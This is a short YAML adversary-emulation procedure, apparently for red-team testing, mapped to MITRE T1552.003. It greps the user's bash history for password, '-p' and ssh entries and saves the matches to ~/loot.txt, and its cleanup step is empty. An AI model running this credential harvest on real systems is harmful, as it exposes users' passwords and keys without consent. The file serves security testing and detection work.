api_version: "2.0"
name: Search Through Bash History
description: |
    Search through bash history for specifice commands we want to capture
args:
    - name: output_file
      type: path
      default: ~/loot.txt
    - name: bash_history_grep_args
      type: path
      default: -e '-p ' -e 'pass' -e 'ssh'
    - name: bash_history_filename
      type: path
      default: ~/.bash_history
uuid: 3cfde62b-7c33-4b26-a61e-755d6131c8ce
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1552: Unsecured Credentials'
    subtechniques:
        - 'T1552.003: Bash History'
requirements:
    platforms:
        - os: linux
        - os: darwin
steps:
    - name: search-through-bash-history
      inline: |
        cat {{.Args.bash_history_filename}} | grep {{.Args.bash_history_grep_args}} > {{.Args.output_file}}
      executor: sh
      cleanup:
        inline: ""
        executor: sh
